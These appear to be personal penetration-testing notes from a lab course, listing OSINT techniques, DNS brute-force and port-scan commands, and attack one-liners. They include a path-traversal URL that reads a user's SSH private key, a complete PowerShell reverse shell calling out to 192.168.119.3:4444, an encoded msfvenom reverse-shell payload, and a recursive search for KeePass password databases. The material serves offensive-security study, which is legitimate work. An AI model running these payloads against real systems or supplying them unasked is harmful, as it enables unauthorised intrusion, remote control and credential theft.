Passive OSINT
1. whois

2. robots.txt

3. google dork 

ext:php, ext:xml, and ext:py

https://searchdns.netcraft.com

4. Github Dork

- sw gitleak

filename:users


5. Shodan

6. SSL/TLS Headers



Actove OSINT

cat list.txt
www
ftp
mail
owa
proxy
router



for ip in $(cat list.txt); do host $ip.megacorpone.com; done


for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not
found"



UDP scan
sudo nmap -sU 192.168.50.149

dnsrecon -d megacorpone.com -t std


pingsweep 

nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt


powershell tcp scan
1..1024 | % {echo ((New-Object
Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null



install telnet client

dism /online /Enable-Feature /FeatureName:TelnetClient




http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offs
ec/.ssh/id_rsa


powershell reverse

$Text = '$client = New-Object
System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream =
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0,
$bytes.Length)) -ne 0){;$data = (New-Object -TypeName
System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-
String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte =
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng
th);$stream.Flush()};$client.Close()'
PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)



msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443
EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"


Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction
SilentlyContinue